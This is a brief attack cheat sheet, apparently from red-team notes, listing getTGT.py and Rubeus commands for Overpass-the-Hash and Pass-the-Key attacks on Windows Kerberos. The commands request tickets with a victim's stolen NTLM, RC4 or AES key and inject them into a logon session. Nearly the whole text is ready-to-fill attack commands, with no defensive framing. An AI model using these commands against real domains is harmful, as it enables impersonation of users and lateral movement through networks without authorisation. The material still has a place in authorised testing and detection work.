# Overpass the Hash / Pass the Key (PtK)

## Tools: Rubeus , getTGT.py

#### 1) getTGT.py

 - getTGT.py DOMAIN/USER -hashes:HASHES (Overpass the Hash. Pass the ticket with NTLM hash)

 - getTGT.py -aesKey 'KEY' DOMAIN/USER@IP (Pass the Key. Pass the ticket with AES Key)

#### 2) Rubeus

 - Rubeus asktgt /user:VICTIM /rc4:RC4_VALUE

 - Rubeus ptt /ticket:TICKET (Successful PtT attack)

### Alternate usage:

 - Rubeus asktgt /user:VICTIM /rc4:RC4_VALUE

 - Rubeus createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]

 - Rubeus ptt /luid:0xdeadbeef /ticket:TICKET (Pass the ticket)
